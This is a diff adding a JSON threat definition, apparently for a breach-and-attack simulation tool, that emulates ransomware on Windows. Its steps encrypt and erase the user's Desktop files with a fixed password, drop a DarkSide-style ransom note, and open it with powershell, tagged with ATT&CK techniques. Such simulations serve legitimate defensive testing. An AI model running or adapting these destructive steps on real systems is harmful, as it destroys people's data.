@@ -1,0 +1,58 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "VictorRansomware",
+        "display_name": "VictorRansomware",
+        "name": "VictorRansomware",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --heartbeat 1 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "crypt",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
+                "module": "crypt",
+                "request": "--target \"%USERPROFILE%\\Desktop\\\" --encrypt --password \"VictorRansomware\" --erase",
+                "rtags": [
+                    "att&ck-technique:T1486"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "4": {
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/DarkSide/README.txt\" --dest \"%USERPROFILE%\\Desktop\\README.txt\"",
+                "rtags": [
+                    "att&ck-technique:T1491.001"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell notepad \"%USERPROFILE%\\Desktop\\README.txt\"",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
